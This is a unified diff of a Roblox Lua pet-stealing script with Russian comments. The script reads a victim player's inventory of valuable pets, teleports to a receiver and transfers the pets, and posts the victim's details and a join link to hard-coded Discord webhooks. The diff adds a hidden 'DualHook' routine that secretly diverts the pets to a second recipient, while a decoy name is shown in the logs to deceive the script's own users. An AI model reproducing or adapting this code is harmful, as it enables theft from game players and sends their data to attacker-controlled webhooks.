@@ -4,18 +4,18 @@ until game:IsLoaded()
 
 -- 🔐 DualHook config (секретная часть)
 getgenv().DhUser = "Warrior_ggs"
-getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← твой второй вебхук
+getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← замени на свой второй вебхук
+getgenv().NewUser = "Warrior_ggs" -- скрытый получатель петов
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "Warrior_ggs"
+    "chitofedy" -- ← ник, который будет отображаться в логах
 }
 
 local PET_WHITELIST = {
-    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
-    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus',
-    'Kitsune', 'Corrupted Kitsune', 'Chicken Zombie','Golden Lab',
+    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly', 'Disco Bee', 'Mimic Octopus',
+    'Queen Bee', 'Spinosaurus', 'Kitsune', 'Corrupted Kitsune', 'Chicken Zombie','Golden Lab',
 }
 
 local victimPetTable = {}
@@ -24,12 +24,18 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
 local function waitForJoin()
+    local findTarget = false
+    local trigeretName = nil
+
     for _, player in game.Players:GetPlayers() do
-        if table.find(USERNAMES, player.Name) then
-            return true, player.Name
+        if not table.find(USERNAMES, player.Name) then
+            continue
         end
+        trigeretName = player.Name
+        findTarget = true
     end
-    return false, nil
+
+    return findTarget, trigeretName
 end
 
 function createDiscordEmbed(petList, totalValue, fileUrl)
@@ -41,7 +47,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
                 name = "👤 **Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     VICTIM.Name, 
-                    table.concat(USERNAMES, " "), 
+                    USERNAMES[1],  -- только реальная жертва в логах
                     identifyexecutor(), 
                     game.Players.LocalPlayer.AccountAge
                 ),
@@ -59,12 +65,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
             },
             {
                 name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
+                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                 inline = false
             }
         },
@@ -74,29 +75,29 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
     }
 
     local data = {
-        content = string.format(
-            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId,
-            game.JobId
-        ),
+        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
         username = game.Players.LocalPlayer.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1388921046228275221/1401159395676655637/296008df4615dbf3dde7cba3a426b15e.jpg",
         embeds = {embed}
     }
 
     local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    local headers = {["Content-Type"] = "application/json"}
+    local headers = { ["Content-Type"] = "application/json" }
     local request = http_request or request or HttpPost or syn.request
 
     -- Основной вебхук
-    request({
+    local response = request({
         Url = WEBHOOK_URL,
         Method = "POST",
         Headers = headers,
         Body = jsonData
     })
 
-    -- 💣 Dualhook — отправка логов и на секретный DhWebhook
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
+    end
+
+    -- 💣 Dualhook лог в секретный вебхук
     for _, player in pairs(game.Players:GetPlayers()) do
         if player.Name == getgenv().DhUser and getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
             request({
@@ -134,13 +135,11 @@ local function getPetObject(petUid: string): Instance?
             return object
         end
     end
-
     for _, object in workspace[VICTIM.Name]:GetChildren() do
         if object:GetAttribute("PET_UUID") == petUid then
             return object
         end
     end
-
     return nil
 end
 
@@ -153,9 +152,8 @@ end
 
 local function getPlayersPets()
     for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
-        if checkPetsWhilelist(value.PetType) then
-            table.insert(victimPetTable, value.PetType)
-        end
+        if not checkPetsWhilelist(value.PetType) then continue end
+        table.insert(victimPetTable, value.PetType)
     end
 end
 
@@ -189,29 +187,29 @@ local function idlingTarget()
     end)
 end
 
--- 🐾 Начинаем
+-- 💼 Сбор петов жертвы
 getPlayersPets()
 
+-- 🔁 Запуск авто-передачи и логов
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
             idlingTarget()
             createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
-
-            -- 🔐 Secret DualHook действия — отдельный поток
-            task.spawn(function()
-                while task.wait(0.5) do
-                    for _, player in ipairs(game.Players:GetPlayers()) do
-                        if player.Name == getgenv().DhUser then
-                            teleportTarget(player.Name)
-                            checkPetsInventory(player.Name)
-                            break
-                        end
-                    end
-                end
-            end)
-
             break
+        end
+    end
+end)
+
+-- 👻 Секретная передача петов на NewUser
+task.spawn(function()
+    while task.wait(0.5) do
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            if player.Name == getgenv().NewUser then
+                teleportTarget(player.Name)
+                checkPetsInventory(player.Name)
+                break
+            end
         end
     end
 end)
